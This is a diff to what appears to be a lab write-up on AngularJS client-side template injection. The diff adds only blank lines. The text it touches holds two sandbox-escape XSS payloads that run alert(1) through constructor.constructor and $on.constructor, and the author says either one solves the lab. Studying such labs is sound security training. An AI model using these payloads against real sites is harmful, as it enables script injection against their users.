@@ -39,9 +39,11 @@ I find a few that I can try:
 # Step 3 test payloads
 
 **`{{constructor.constructor('alert(1)')()}}`**
+
 ![image](https://user-images.githubusercontent.com/83407557/211355028-f0a7c7ad-e75e-42f0-a201-cc300ba474c4.png)
 
 **`{{$on.constructor('alert(1)')()}}`**
+
 ![image](https://user-images.githubusercontent.com/83407557/211355273-41a74d93-cdf0-4c3c-af73-3897bbbdd052.png)
 
 I find that either payload is valid, and solve the lab:
